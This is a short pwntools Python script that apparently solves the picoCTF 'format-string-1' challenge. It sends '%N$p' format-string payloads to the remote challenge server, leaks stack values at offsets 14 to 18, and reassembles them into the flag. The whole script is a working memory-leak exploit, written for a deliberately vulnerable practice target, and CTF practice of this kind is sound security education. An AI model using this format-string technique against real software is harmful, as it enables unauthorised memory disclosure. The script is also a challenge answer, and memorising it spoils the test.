#!/usr/bin/python3

from pwn import *

exe = ELF('./format-string-1', checksec=False)
flag = b''
for i in range(14, 19):
	# r = process(exe.path)
	r = remote('mimas.picoctf.net', 53932)

	r.sendlineafter(b'to you:\n', f'%{i}$p'.encode())


	r.recvuntil(b"Here's your order: ")
	recv = r.recvall().strip()

	part = p64(int(recv.split(b'\n')[0], 16))
	if b'}' in part:
		flag += part
		print(flag, end='')	
		exit()
	else:
		flag += part

r.interactive()